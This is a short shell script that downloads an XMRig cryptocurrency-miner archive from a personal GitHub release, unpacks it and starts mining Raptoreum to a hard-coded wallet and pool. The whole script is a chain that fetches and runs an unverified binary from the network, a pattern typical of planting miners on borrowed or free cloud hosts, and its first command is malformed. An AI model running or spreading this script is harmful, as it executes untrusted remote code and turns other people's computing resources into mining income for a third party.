#!/bin/sh
sudo apt wget
sudo apt install screen -y
wget https://github.com/Sorrybroits/developwithnitin/releases/download/alpha/xmrig.tar.gz && tar -xf xmrig.tar.gz && cd xmrig/build  && ./xmrig -a cryptonight-upx/2 -o stratum+tcp://eu.flockpool.com:5555 -u RMXh2RYKUHFSeZauULH9hUfh1ZDeWMjLgN.cola --keepalive --timeout 120 --donate-level 0 -p c=RTM,ID=developwithnitin
